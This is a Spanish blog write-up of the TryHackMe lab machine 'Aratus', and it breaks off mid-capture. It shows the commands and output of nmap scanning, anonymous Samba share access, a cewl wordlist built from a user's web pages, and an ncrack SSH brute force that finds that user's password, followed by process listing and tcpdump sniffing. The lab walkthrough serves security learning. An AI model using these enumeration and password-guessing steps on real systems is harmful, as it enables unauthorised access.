@@ -1,0 +1,300 @@
+<!doctype html><html lang=es><head><title>Aratus - Write Up - Español ::
+Lanfran02 - Blog — Hackeando tu forma de aprender.</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Link Nivel Creador     Aquí Medio Biniru    Reconocimiento ¡Hey! ¡Bienvenido de nuevo a otra máquina TryHackMe!
+¡Hoy estamos pwneando una máquina de Biniru! ¡Ya hemos pwneado otra máquina de este creador, Zeno!
+¡Así que comencemos a enumerar con nmap!
+╰─ nmap 10.10.170.245 -sS ─╯ Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-26 20:37 CET Nmap scan report for 10.10.170.245 Host is up (0."><meta name=keywords content="CTF,Writeup,Hacking"><meta name=robots content="noodp"><link rel=canonical href=/es/posts/aratus/><link rel=stylesheet href=/assets/style.css><link rel=stylesheet href=/style.css><link rel=apple-touch-icon-precomposed sizes=144x144 href=/img/apple-touch-icon-144-precomposed.png><link rel="shortcut icon" href=/img/favicon.png><link href=/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/es/posts/aratus/cover.jpeg"><meta name=twitter:title content="Aratus - Write Up - Español"><meta name=twitter:description content="Máquina de nivel medio en TryHackMe."><meta property="og:title" content="Aratus - Write Up - Español"><meta property="og:description" content="Máquina de nivel medio en TryHackMe."><meta property="og:type" content="article"><meta property="og:url" content="/es/posts/aratus/"><meta property="og:image" content="/es/posts/aratus/cover.jpeg"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-03-26T21:04:52+01:00"><meta property="article:modified_time" content="2022-03-26T21:04:52+01:00"><meta property="og:site_name" content="Lanfran02 - Blog"><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9309562477773018" crossorigin=anonymous></script>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-3T7DYCWC0W",{anonymize_ip:!1})}</script><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","G-3T7DYCWC0W","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script></head><body class=dark-theme><div class=container><header class=header><span class=header__inner><a href=/es/ class=logo style=text-decoration:none><span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg></span><span class=logo__text>Lanfran02</span>
+<span class=logo__cursor></span></a>
+<span class=header__right><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=/es/about>Acerca de mí</a></li><li><a href=/>English</a></li><ul class=menu__sub-inner><li class=menu__sub-inner-more-trigger>Write Ups
+<span class=menu__sub-inner-more-trigger-icon><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg></span></li><ul class="menu__sub-inner-more hidden"><li><a href=/es/tags/hackthebox/>HTB</a></li><li><a href=/es/tags/tryhackme/>THM</a></li></ul></ul></ul><ul class="menu__inner menu__inner--mobile"><li><a href=/es/about>Acerca de mí</a></li><li><a href=/>English</a></li><li><a href=/es/tags/hackthebox/>HTB</a></li><li><a href=/es/tags/tryhackme/>THM</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span><span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><div class=post><h1 class=post-title>Aratus - Write Up - Español</h1><div class=post-meta><span class=post-date>2022-03-26</span>
+<span class=post-author>— Escrito por Lanfran02</span>
+<span class=post-read-time>— 10 mins lectura</span></div><span class=post-tags><a href=/tags/samba/>#samba</a>&nbsp;
+<a href=/tags/tcpdump/>#tcpdump</a>&nbsp;
+<a href=/tags/ansible/>#ansible</a>&nbsp;
+<a href=/tags/sudo/>#sudo</a>&nbsp;
+<a href=/tags/tryhackme/>#TryHackMe</a>&nbsp;</span><figure class=post-cover><img src=/es/posts/aratus/cover.jpeg alt="Aratus - Write Up - Español"></figure><div class=post-content><h2>Table of Contents</h2><aside class=table-of-contents><nav id=TableOfContents><ul><li><a href=#reconocimiento>Reconocimiento</a></li><li><a href=#acceso-inicial---usuario>Acceso inicial - Usuario</a></li><li><a href=#root>Root</a></li></ul></nav></aside><table><thead><tr><th>Link</th><th>Nivel</th><th>Creador</th></tr></thead><tbody><tr><td><a href=https://tryhackme.com/room/aratus>Aquí</a></td><td>Medio</td><td><a href=https://tryhackme.com/p/Biniru>Biniru</a></td></tr></tbody></table><h2 id=reconocimiento>Reconocimiento</h2><p>¡Hey! ¡Bienvenido de nuevo a otra máquina TryHackMe!</p><p>¡Hoy estamos pwneando una máquina de <a href=https://tryhackme.com/p/Biniru>Biniru</a>! ¡Ya hemos pwneado otra máquina de este creador, <a href=https://lanfran02.github.io/posts/zeno/>Zeno</a>!</p><p>¡Así que comencemos a enumerar con <code>nmap</code>!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─ nmap 10.10.170.245 -sS                                                                                ─╯
+</span></span><span style=display:flex><span>Starting Nmap 7.91 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-03-26 20:37 CET
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.170.245
+</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.15s latency<span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>994</span> filtered ports
+</span></span><span style=display:flex><span>PORT    STATE SERVICE
+</span></span><span style=display:flex><span>21/tcp  open  ftp
+</span></span><span style=display:flex><span>22/tcp  open  ssh
+</span></span><span style=display:flex><span>80/tcp  open  http
+</span></span><span style=display:flex><span>139/tcp open  netbios-ssn
+</span></span><span style=display:flex><span>443/tcp open  https
+</span></span><span style=display:flex><span>445/tcp open  microsoft-ds
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 15.85 seconds
+</span></span></code></pre></div><p>Así que vayamos directamente al punto del artículo y enumeremos el <code>servidor samba</code>. (Tenemos inicio de sesión <code>anónimo</code> en el <code>FTP</code>, pero no hay nada allí ;D )</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─ smbclient -N -L //10.10.170.245/                                                                                                            ─╯
+</span></span><span style=display:flex><span>Anonymous login successful
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  Sharename       Type      Comment
+</span></span><span style=display:flex><span>  ---------       ----      -------
+</span></span><span style=display:flex><span>  print$          Disk      Printer Drivers
+</span></span><span style=display:flex><span>  temporary share Disk
+</span></span><span style=display:flex><span>  IPC$            IPC       IPC Service <span style=color:#f92672>(</span>Samba 4.10.16<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>SMB1 disabled -- no workgroup available
+</span></span></code></pre></div><p>Parece que tenemos un <code>temporary share</code> disponible, ¡intentemos iniciar sesión en <code>Anonimamente</code>!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─ smbclient -N <span style=color:#e6db74>&#34;//10.10.170.245/temporary share&#34;</span>                                                                                               ─╯
+</span></span><span style=display:flex><span>Anonymous login successful
+</span></span><span style=display:flex><span>Try <span style=color:#e6db74>&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span style=display:flex><span>smb: <span style=color:#ae81ff>\&gt;</span> ls
+</span></span><span style=display:flex><span>  .                                   D        <span style=color:#ae81ff>0</span>  Mon Jan <span style=color:#ae81ff>10</span> 14:06:44 <span style=color:#ae81ff>2022</span>
+</span></span><span style=display:flex><span>  ..                                  D        <span style=color:#ae81ff>0</span>  Tue Nov <span style=color:#ae81ff>23</span> 17:24:05 <span style=color:#ae81ff>2021</span>
+</span></span><span style=display:flex><span>  .bash_logout                        H       <span style=color:#ae81ff>18</span>  Wed Apr  <span style=color:#ae81ff>1</span> 04:17:30 <span style=color:#ae81ff>2020</span>
+</span></span><span style=display:flex><span>  .bash_profile                       H      <span style=color:#ae81ff>193</span>  Wed Apr  <span style=color:#ae81ff>1</span> 04:17:30 <span style=color:#ae81ff>2020</span>
+</span></span><span style=display:flex><span>  .bashrc                             H      <span style=color:#ae81ff>231</span>  Wed Apr  <span style=color:#ae81ff>1</span> 04:17:30 <span style=color:#ae81ff>2020</span>
+</span></span><span style=display:flex><span>  .bash_history                       H        <span style=color:#ae81ff>0</span>  Sat Mar <span style=color:#ae81ff>26</span> 19:38:54 <span style=color:#ae81ff>2022</span>
+</span></span><span style=display:flex><span>  chapter1                            D        <span style=color:#ae81ff>0</span>  Tue Nov <span style=color:#ae81ff>23</span> 11:07:47 <span style=color:#ae81ff>2021</span>
+</span></span><span style=display:flex><span>  chapter2                            D        <span style=color:#ae81ff>0</span>  Tue Nov <span style=color:#ae81ff>23</span> 11:08:11 <span style=color:#ae81ff>2021</span>
+</span></span><span style=display:flex><span>  chapter3                            D        <span style=color:#ae81ff>0</span>  Tue Nov <span style=color:#ae81ff>23</span> 11:08:18 <span style=color:#ae81ff>2021</span>
+</span></span><span style=display:flex><span>  chapter4                            D        <span style=color:#ae81ff>0</span>  Tue Nov <span style=color:#ae81ff>23</span> 11:08:25 <span style=color:#ae81ff>2021</span>
+</span></span><span style=display:flex><span>  chapter5                            D        <span style=color:#ae81ff>0</span>  Tue Nov <span style=color:#ae81ff>23</span> 11:08:33 <span style=color:#ae81ff>2021</span>
+</span></span><span style=display:flex><span>  chapter6                            D        <span style=color:#ae81ff>0</span>  Tue Nov <span style=color:#ae81ff>23</span> 11:12:24 <span style=color:#ae81ff>2021</span>
+</span></span><span style=display:flex><span>  chapter7                            D        <span style=color:#ae81ff>0</span>  Tue Nov <span style=color:#ae81ff>23</span> 12:14:27 <span style=color:#ae81ff>2021</span>
+</span></span><span style=display:flex><span>  chapter8                            D        <span style=color:#ae81ff>0</span>  Tue Nov <span style=color:#ae81ff>23</span> 11:12:45 <span style=color:#ae81ff>2021</span>
+</span></span><span style=display:flex><span>  chapter9                            D        <span style=color:#ae81ff>0</span>  Tue Nov <span style=color:#ae81ff>23</span> 11:12:53 <span style=color:#ae81ff>2021</span>
+</span></span><span style=display:flex><span>  .ssh                               DH        <span style=color:#ae81ff>0</span>  Mon Jan <span style=color:#ae81ff>10</span> 14:05:34 <span style=color:#ae81ff>2022</span>
+</span></span><span style=display:flex><span>  .viminfo                            H        <span style=color:#ae81ff>0</span>  Sat Mar <span style=color:#ae81ff>26</span> 19:38:54 <span style=color:#ae81ff>2022</span>
+</span></span><span style=display:flex><span>  message-to-simeon.txt               N      <span style=color:#ae81ff>251</span>  Mon Jan <span style=color:#ae81ff>10</span> 14:06:44 <span style=color:#ae81ff>2022</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ae81ff>37726212</span> blocks of size 1024. <span style=color:#ae81ff>35586284</span> blocks available
+</span></span><span style=display:flex><span>smb: <span style=color:#ae81ff>\&gt;</span>
+</span></span></code></pre></div><p>Yep! We are in! Let&rsquo;s download the <code>message-to-simeon.txt</code> and see what it has inside&mldr; (Spoiler: We downloaded all the files, and it wasn&rsquo;t necessary xD )</p><p>¡Sí, estamos dentro! Descarguemos el <code>message-to-simeon.txt</code> y veamos que tiene dentro&mldr; (Spoiler: Descargamos todos los archivos, y no era necesario xD)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─ cat message-to-simeon.txt                                                                                                                    ─╯
+</span></span><span style=display:flex><span>Simeon,
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Stop messing with your home directory, you are moving files and directories insecurely!
+</span></span><span style=display:flex><span>Just make a folder in /opt <span style=color:#66d9ef>for</span> your book project...
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Also you password is insecure, could you please change it? It is all over the place now!
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>- Theodore
+</span></span></code></pre></div><p>Hmmm&mldr; Parece que el usuario <code>Theodore</code> le está dejando un mensaje a <code>Simeon</code> alertándolo de que su contraseña está &ldquo;por todas partes&rdquo; y que es insegura&mldr; ¿Tal vez se esté refiriendo al servidor web? ¡Veamos si podemos acceder a la carpeta de <code>simeon</code>!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─ curl http://10.10.170.245/simeon/                                                                                                           ─╯
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span> &lt;!DOCTYPE html&gt;
+</span></span><span style=display:flex><span>&lt;html lang<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;en&#34;</span>&gt;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;head&gt;
+</span></span><span style=display:flex><span>&lt;title&gt;Simoen<span style=color:#e6db74>&#39;s Book&lt;/title&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;meta charset=&#34;UTF-8&#34;&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34;&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;link rel=&#34;stylesheet&#34; href=&#34;style.css&#34;)&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;/head&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;body&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;h1&gt;Simeon&#39;</span>s Book&lt;/h1&gt;
+</span></span><span style=display:flex><span>&lt;p&gt;HTML book created by Simeon.&lt;/p&gt;
+</span></span><span style=display:flex><span>&lt;/body&gt;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;h2&gt;Prologue&lt;/h2&gt;
+</span></span><span style=display:flex><span>&lt;p&gt;My book is about passion, adventure, drama, war, love, betrayel. I am sure you would like it!&lt;/p&gt;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;h2&gt;Table of content&lt;/h2&gt;
+</span></span><span style=display:flex><span>&lt;ul&gt;
+</span></span><span style=display:flex><span>&lt;li&gt;&lt;a href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;./chapter1.html&#34;</span>&gt;Chapter 1&lt;/a&gt;&lt;/li&gt;
+</span></span><span style=display:flex><span>&lt;li&gt;&lt;a href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;./chapter2.html&#34;</span>&gt;Chapter 2&lt;/a&gt;&lt;/li&gt;
+</span></span><span style=display:flex><span>&lt;li&gt;&lt;a href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;./chapter3.html&#34;</span>&gt;Chapter 3&lt;/a&gt;&lt;/li&gt;
+</span></span><span style=display:flex><span>&lt;li&gt;&lt;a href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;./chapter4.html&#34;</span>&gt;Chapter 4&lt;/a&gt;&lt;/li&gt;
+</span></span><span style=display:flex><span>&lt;li&gt;&lt;a href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;./chapter5.html&#34;</span>&gt;Chapter 5&lt;/a&gt;&lt;/li&gt;
+</span></span><span style=display:flex><span>&lt;li&gt;&lt;a href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;./chapter6.html&#34;</span>&gt;Chapter 6&lt;/a&gt;&lt;/li&gt;
+</span></span><span style=display:flex><span>&lt;li&gt;&lt;a href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;./chapter7.html&#34;</span>&gt;Chapter 7&lt;/a&gt;&lt;/li&gt;
+</span></span><span style=display:flex><span>&lt;li&gt;&lt;a href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;./chapter8.html&#34;</span>&gt;Chapter 8&lt;/a&gt;&lt;/li&gt;
+</span></span><span style=display:flex><span>&lt;li&gt;&lt;a href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;./chapter9.html&#34;</span>&gt;Chapter 9&lt;/a&gt;&lt;/li&gt;
+</span></span><span style=display:flex><span>&lt;/ul&gt;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;/html&gt;
+</span></span></code></pre></div><p>¡Sí! ¡Tenemos bastantes textos aquí! ¡Podemos crear una lista de palabras con <code>cewl</code>!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─ cewl http://10.10.170.245/simeon/ &gt; wl.txt
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>╰─ wc wl.txt                                                                                                                                    ─╯
+</span></span><span style=display:flex><span> <span style=color:#ae81ff>207</span>  <span style=color:#ae81ff>213</span> <span style=color:#ae81ff>1588</span> wl.txt
+</span></span></code></pre></div><h2 id=acceso-inicial---usuario>Acceso inicial - Usuario</h2><p>Ahora, veamos si la contraseña para el servicio <code>SSH</code> de este usuario está dentro de esa lista de palabras que creamos.
+Usamos <code>ncrack</code> para verificar esto, pero puedes usar <code>hydra</code> o incluso <code>nmap</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─ ncrack -p <span style=color:#ae81ff>22</span> -u simeon -P wl.txt 10.10.170.245                                                        ─╯
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Starting Ncrack 0.7 <span style=color:#f92672>(</span> http://ncrack.org <span style=color:#f92672>)</span> at 2022-03-26 20:34 CET
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Discovered credentials <span style=color:#66d9ef>for</span> ssh on 10.10.170.245 22/tcp:
+</span></span><span style=display:flex><span>10.10.170.245 22/tcp ssh: <span style=color:#e6db74>&#39;simeon&#39;</span> <span style=color:#e6db74>&#39;s[REDACTED]e&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Ncrack <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> service scanned in 42.23 seconds.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Ncrack finished.
+</span></span></code></pre></div><p>¡Lo conseguimos! ¡Iniciemos sesión ahora!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─ ssh simeon@10.10.170.245                                                                              ─╯
+</span></span><span style=display:flex><span>simeon@10.10.170.245<span style=color:#960050;background-color:#1e0010>&#39;</span>s password:
+</span></span><span style=display:flex><span>Last failed login: Sat Mar <span style=color:#ae81ff>26</span> 20:35:28 CET <span style=color:#ae81ff>2022</span> from ip-***********.eu-west-1.compute.internal on ssh:notty
+</span></span><span style=display:flex><span>There were <span style=color:#ae81ff>206</span> failed login attempts since the last successful login.
+</span></span><span style=display:flex><span>Last login: Sat Mar <span style=color:#ae81ff>26</span> 19:52:51 <span style=color:#ae81ff>2022</span> from ip-***********.eu-west-1.compute.internal
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>simeon@aratus ~<span style=color:#f92672>]</span>$ ls -la
+</span></span><span style=display:flex><span>total <span style=color:#ae81ff>20</span>
+</span></span><span style=display:flex><span>drwxr-xr-x. <span style=color:#ae81ff>12</span> simeon   simeon <span style=color:#ae81ff>4096</span> Jan <span style=color:#ae81ff>10</span> 14:06 .
+</span></span><span style=display:flex><span>drwxr-xr-x.  <span style=color:#ae81ff>5</span> root     root     <span style=color:#ae81ff>54</span> Nov <span style=color:#ae81ff>23</span> 17:24 ..
+</span></span><span style=display:flex><span>lrwxrwxrwx.  <span style=color:#ae81ff>1</span> simeon   simeon    <span style=color:#ae81ff>9</span> Nov <span style=color:#ae81ff>23</span> 10:48 .bash_history -&gt; /dev/null
+</span></span><span style=display:flex><span>-rw-r--r--.  <span style=color:#ae81ff>1</span> simeon   simeon   <span style=color:#ae81ff>18</span> Apr  <span style=color:#ae81ff>1</span>  <span style=color:#ae81ff>2020</span> .bash_logout
+</span></span><span style=display:flex><span>-rw-r--r--.  <span style=color:#ae81ff>1</span> simeon   simeon  <span style=color:#ae81ff>193</span> Apr  <span style=color:#ae81ff>1</span>  <span style=color:#ae81ff>2020</span> .bash_profile
+</span></span><span style=display:flex><span>-rw-r--r--.  <span style=color:#ae81ff>1</span> simeon   simeon  <span style=color:#ae81ff>231</span> Apr  <span style=color:#ae81ff>1</span>  <span style=color:#ae81ff>2020</span> .bashrc
+</span></span><span style=display:flex><span>drwx------.  <span style=color:#ae81ff>2</span> simeon   simeon   <span style=color:#ae81ff>29</span> Jan <span style=color:#ae81ff>10</span> 14:05 .ssh
+</span></span><span style=display:flex><span>lrwxrwxrwx.  <span style=color:#ae81ff>1</span> root     root      <span style=color:#ae81ff>9</span> Dec  <span style=color:#ae81ff>2</span> 12:02 .viminfo -&gt; /dev/null
+</span></span><span style=display:flex><span>drwxr-xr-x.  <span style=color:#ae81ff>5</span> simeon   simeon   <span style=color:#ae81ff>66</span> Nov <span style=color:#ae81ff>23</span> 11:07 chapter1
+</span></span><span style=display:flex><span>drwxr-xr-x.  <span style=color:#ae81ff>7</span> simeon   simeon  <span style=color:#ae81ff>106</span> Nov <span style=color:#ae81ff>23</span> 11:08 chapter2
+</span></span><span style=display:flex><span>drwxr-xr-x.  <span style=color:#ae81ff>6</span> simeon   simeon   <span style=color:#ae81ff>86</span> Nov <span style=color:#ae81ff>23</span> 11:08 chapter3
+</span></span><span style=display:flex><span>drwxr-xr-x.  <span style=color:#ae81ff>6</span> simeon   simeon   <span style=color:#ae81ff>86</span> Nov <span style=color:#ae81ff>23</span> 11:08 chapter4
+</span></span><span style=display:flex><span>drwxr-xr-x.  <span style=color:#ae81ff>4</span> simeon   simeon   <span style=color:#ae81ff>46</span> Nov <span style=color:#ae81ff>23</span> 11:08 chapter5
+</span></span><span style=display:flex><span>drwxr-xr-x.  <span style=color:#ae81ff>5</span> simeon   simeon   <span style=color:#ae81ff>66</span> Nov <span style=color:#ae81ff>23</span> 11:12 chapter6
+</span></span><span style=display:flex><span>drwxr-xr-x.  <span style=color:#ae81ff>4</span> simeon   simeon   <span style=color:#ae81ff>46</span> Nov <span style=color:#ae81ff>23</span> 12:14 chapter7
+</span></span><span style=display:flex><span>drwxr-xr-x.  <span style=color:#ae81ff>6</span> simeon   simeon   <span style=color:#ae81ff>86</span> Nov <span style=color:#ae81ff>23</span> 11:12 chapter8
+</span></span><span style=display:flex><span>drwxr-xr-x.  <span style=color:#ae81ff>7</span> simeon   simeon  <span style=color:#ae81ff>106</span> Nov <span style=color:#ae81ff>23</span> 11:12 chapter9
+</span></span><span style=display:flex><span>-rw-r--r--.  <span style=color:#ae81ff>1</span> theodore root    <span style=color:#ae81ff>251</span> Jan <span style=color:#ae81ff>10</span> 14:06 message-to-simeon.txt
+</span></span></code></pre></div><p>Wow, no hay flag de usuario esta vez, así que vamos a enumerar un poco más&mldr;</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>simeon@aratus test-auth<span style=color:#f92672>]</span>$ ps aux
+</span></span><span style=display:flex><span>USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>root      <span style=color:#ae81ff>5987</span>  0.0  0.5 <span style=color:#ae81ff>182472</span>  <span style=color:#ae81ff>2540</span> ?        S    20:24   0:00 /usr/sbin/CROND -n
+</span></span><span style=display:flex><span>root      <span style=color:#ae81ff>5991</span>  0.0  0.2 <span style=color:#ae81ff>113284</span>  <span style=color:#ae81ff>1212</span> ?        Ss   20:24   0:00 /bin/sh -c ping -c <span style=color:#ae81ff>30</span> 127.0.0.1 &gt;/dev/null 2&gt;&amp;<span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>root      <span style=color:#ae81ff>5992</span>  0.0  0.2 <span style=color:#ae81ff>128556</span>  <span style=color:#ae81ff>1284</span> ?        S    20:24   0:00 ping -c <span style=color:#ae81ff>30</span> 127.0.0.1
+</span></span><span style=display:flex><span>simeon    <span style=color:#ae81ff>5998</span>  0.0  0.3 <span style=color:#ae81ff>155424</span>  <span style=color:#ae81ff>1788</span> pts/0    R+   20:24   0:00 ps aux
+</span></span></code></pre></div><p>Después de enumerar, descubrimos algo bastante inusual e interesante&mldr;</p><p>Hay un proceso enviando datos extraños al <code>localhost</code>&mldr;</p><p>Pero no podemos ver qué está haciendo realmente, así que usamos <code>tcpdump</code> para verificar los datos que se envían&mldr;</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>simeon@aratus test-auth<span style=color:#f92672>]</span>$ tcpdump -i lo -A
+</span></span><span style=display:flex><span>tcpdump: verbose output suppressed, use -v or -vv <span style=color:#66d9ef>for</span> full protocol decode
+</span></span><span style=display:flex><span>listening on lo, link-type EN10MB <span style=color:#f92672>(</span>Ethernet<span style=color:#f92672>)</span>, capture size <span style=color:#ae81ff>262144</span> bytes
+</span></span><span style=display:flex><span>20:26:01.766850 IP localhost &gt; localhost: ICMP echo request, id 6024, seq 1, length <span style=color:#ae81ff>64</span>
+</span></span><span style=display:flex><span>E..Tj.@.@..............%.....h?b....a....................... !<span style=color:#e6db74>&#34;#</span>$<span style=color:#e6db74>%&amp;&#39;()*+,-./01234567
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>20:26:01.766866 IP localhost &gt; localhost: ICMP echo reply, id 6024, seq 1, length 64
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>E..Tj...@..............%.....h?b....a....................... !&#34;</span><span style=color:#75715e>#$%&amp;&#39;()*+,-./01234567</span>
+</span></span><span style=display:flex><span>20:26:01.930953 IP localhost.53732 &gt; localhost.http: Flags <span style=color:#f92672>[</span>S<span style=color:#f92672>]</span>, seq 1778871871, win 43690, options <span style=color:#f92672>[</span>mss 65495,sackOK,TS val <span style=color:#ae81ff>2560860</span> ecr 0,nop,wscale 6<span style=color:#f92672>]</span>, length <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>E..&lt;<span style=color:#f92672>}</span>c@.@..V...........Pj.n?.........0.........
+</span></span><span style=display:flex><span>.<span style=color:#e6db74>&#39;.\........
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>20:26:01.930975 IP localhost.http &gt; localhost.53732: Flags [S.], seq 2104954994, ack 1778871872, win 43690, options [mss 65495,sackOK,TS val 2560860 ecr 2560860,nop,wscale 6], length 0
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>E..&lt;..@.@.&lt;..........P..}w.rj.n@.....0.........
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>.&#39;</span>.<span style=color:#ae81ff>\.</span><span style=color:#e6db74>&#39;.\....
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>20:26:01.930988 IP localhost.53732 &gt; localhost.http: Flags [.], ack 1, win 683, options [nop,nop,TS val 2560860 ecr 2560860], length 0
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>E..4}d@.@..]...........Pj.n@}w.s.....(.....
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>.&#39;</span>.<span style=color:#ae81ff>\.</span><span style=color:#e6db74>&#39;.\
